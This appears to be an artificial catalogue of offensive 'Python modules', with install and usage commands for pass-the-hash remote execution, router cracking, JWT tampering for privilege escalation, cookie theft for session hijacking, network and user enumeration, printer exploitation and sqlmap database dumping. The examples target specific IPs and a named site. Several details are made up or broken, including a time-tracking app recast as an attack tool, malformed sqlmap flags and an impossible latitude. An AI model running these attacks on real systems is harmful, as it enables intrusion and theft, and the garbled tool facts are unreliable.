Python Modules

**Python Module: Evil-Rm**
Connect to a remote machine and execute a command.

Installing
```
pip install evil-rm
```

Usage
```
evil-rm -i <ip address> -u <username> -H <hash>
```

**Important** To use Evil-RM, you need to know the username and password hash of a user on the target device. For this, we recommend reviewing NTLM tools.

Example
```
evil-rm -i 47.189.132.4 -u alex -H 09bb63bf7635f9cfd50f022e7a3b0dba
```

**Python Module: Fern**
A tool for cracking router passwords if the router model is publicly available.

Usage

* Download fern.py from hackdb.net.
* Install python

```
apt-get install python3
```
```
python3 fern.py
```

* Enter router model.

Example

```
python3 /home/user/downloads/fern.py
```

```
Router Model > WN087A2
```

**Python Module: JWT Decoder**
This exploit decodes JWT tokens and manipulates their payload to bypass security and escalate privileges. It's commonly used to exploit weak or absent JWT signature validation mechanisms.

Usage

* Download jwt_decoder.py from hackdb.net.
* Install python

```
apt-get install python3
```
```
python3 jwt_decoder.py <jwt token>
```

Example
```
python3 /home/user/downloads/jwt_decoder.py eyJ...
```

**Python Module: Kimai**
Kimai is vulnerable to SameSite-Cookie-Vulnerability-session-hijacking. The attacker can trick the victim to update or upgrade the system, by using a very malicious exploit to steal his vulnerable cookie and get control of his session.

Kimai is known to be effective on firewalls.

Usage

* Download kimai.py from hackdb.net.
* Install python

```
apt-get install python3
```

* Start listening on Wireshark.
```
python3 kimai.py <ip address>
```
* Kimai may not be able to steal a cookie 100% of the time. If you can't get a cookie, try again.

Example

```
python3 /home/user/downloads/kimai.py 46.20.15.34
```

**Python Module: Net Tree**
This exploit leverages an IP address as input to generate a complete network topology. Using active and passive scanning techniques, the tool identifies routers, switches, and connected devices, along with their open ports and services. The output is visualized using a tree-like structure for better readability.

Usage

* Download net_tree.py from hackdb.net.
* Install python

```
apt-get install python3
```
```
python3 net_tree.py <ip address>
```

Example

```
python3 /home/user/downloads/net_tree.py 46.20.15.34
```

**Python Module: Pret**
PRET is a new tool for printer security testing developed in the scope of a Master's Thesis at Ruhr University Bochum. It connects to a device via network or USB and exploits the features of a given printer language.

Usage

* Download pret.py from hackdb.net.
* Install python

```
apt-get install python3
```
```
python3 pret.py <ip address>
```

Example

```
python3 /home/user/downloads/pret.py 46.20.15.34
```

**Important**

* PRET requires the printer to be reachable via its LAN IP address with port 9100 (RAW printing) open. If port 9100 is closed, PRET cannot communicate with the printer.

**Python Module: pyUserEnum**
pyUserEnum is a tool for enumerate users on a subnet.

Usage

* Download pyUserEnum.py from hackdb.net.
* Install python

```
apt-get install python3
```
```
python3 pyUserEnum.py <ip address>
```

Example

```
python3 /home/user/downloads/pyUserEnum.py 46.20.15.34
```

**Python Module: Sqlmap**
Sqlmap is a tool for testing and exploiting SQL injection vulnerabilities.

Installing

```
pip install sqlmap
```

Usage

```
sqlmap -u <url> <options>
```

or

```
python3 sqlmap.py -u <url> <options>
```

List of available options

* Listing tables:

```
sqlmap -u <url> -tables
```

* Dump table data:

```
sqlmap -u <url> -dump -table <table name>
```

Example usage
Let's say our target is bestecommerce.com and there is a SQL vulnerability.

```
sqlmap -u bestecommerce.com -tables
```

Result


| Table Name |
|------------|
| Products   |
| Users      |

Then

```
sqlmap -u bestecommerce.com -dump -table Products
```

Result

| Product ID | Product Name | Price |
|---|---|---|
| 1 | Phone | 499$ |
| 2 | Computer | 999$ |

**Python Module: WigleNet**
WigleNet is a tool to find all devices in a specific location.

Usage

* Download wiglenet.py from hackdb.net.
* Install python

```
apt-get install python3
```

```
python3 wiglenet.py -lat <latitude> -long <longitude>
```

Example

```
python3 /home/user/downloads/wiglenet.py -lat 145.06 -long 68.592
```